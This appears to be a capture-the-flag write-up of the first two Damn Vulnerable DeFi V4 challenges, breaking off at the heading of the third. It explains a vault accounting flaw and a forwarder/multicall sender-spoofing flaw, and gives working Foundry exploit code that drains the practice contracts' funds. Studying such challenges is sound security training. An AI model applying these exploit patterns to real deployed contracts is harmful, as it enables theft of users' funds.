# Damn Vulnerable DeFi

This is solutions of [Damn Vulnerable DeFi V4](https://www.damnvulnerabledefi.xyz)

### 1. Unstoppable

This topic is about vault flashloan. The idea comes from flashloan function that doing check in total supply and total assets. Let's see following the code below :

<details>

<summary> code </summary>

```javascript
function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amount, bytes calldata data)
        external
        returns (bool)
    {
        if (amount == 0) revert InvalidAmount(0); // fail early
        if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement
        uint256 balanceBefore = totalAssets();
@>        if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement

        // transfer tokens out + execute callback on receiver
        ERC20(_token).safeTransfer(address(receiver), amount);

        // callback must return magic value, otherwise assume it failed
        uint256 fee = flashFee(_token, amount);
        if (
            receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data)
                != keccak256("IERC3156FlashBorrower.onFlashLoan")
        ) {
            revert CallbackFailed();
        }

        // pull amount + fee from receiver, then pay the fee to the recipient
        ERC20(_token).safeTransferFrom(address(receiver), address(this), amount + fee);
        ERC20(_token).safeTransfer(feeRecipient, fee);

        return true;
    }

```

</details>
<br>

There is a difference between `totalSupply` and `totalAssets`. The `totalSupply` refers to the total amount of tokens that the `vault` has minted. Then, the `totalAssets` refers to all amount token DVT that the `vault` holds. So, if someone makes a transfer to `vault` with token DVT, The `totalAssets` will increase, creating a mismatch between `totalSupply` and `totalAssets`.

<details>

<summary> Solution </summary>

```javascript
    function test_unstoppable() public checkSolvedByPlayer {
        require(token.transfer(address(vault), INITIAL_PLAYER_TOKEN_BALANCE));
    }
```

</details>

### 2. Naive Receiver

On this topic, we work with flashloan, delegatecall and EIP-712 as well. In this case, the aims of the chalengge is moving all funds into recovery address and spending player funds. If we are not working with delegatecall, it is difficult to imagine how we would have difficult with it. Also, EIP-712 has it's own difficulty. In short, i have a scenario that :
- make 10 flashloans to spend player funds
- make one transaction to move all of funds to the recovery address
- keep all commands with the encode function with ABI
- At my difficulty, changing the format to EIP-712 is the hardest part

<details>

<summary> Solution </summary>

```javascript
function test_naiveReceiver() public checkSolvedByPlayer {
        bytes[] memory callDatas = new bytes[](11);
        for(uint8 i; i<10; i++){
            callDatas[i] = abi.encodeCall(pool.flashLoan, (receiver, address(weth), 0, ""));
        }
        callDatas[10] = abi.encodePacked(abi.encodeCall(pool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))), bytes32(uint256(uint160(deployer))));        
        bytes memory message = abi.encodeCall(pool.multicall, callDatas);
        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: 30000000,
            nonce: forwarder.nonces(player),
            data: message,
            deadline: 1 days
        });

       bytes32 messageHash = keccak256(abi.encodePacked(
        "\x19\x01", 
        forwarder.domainSeparator(),
        forwarder.getDataHash(request)
       ));

       (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, messageHash);
        bytes memory signature = abi.encodePacked(r, s, v);

        forwarder.execute(request, signature);
    }

```

</details>

### 3. Truster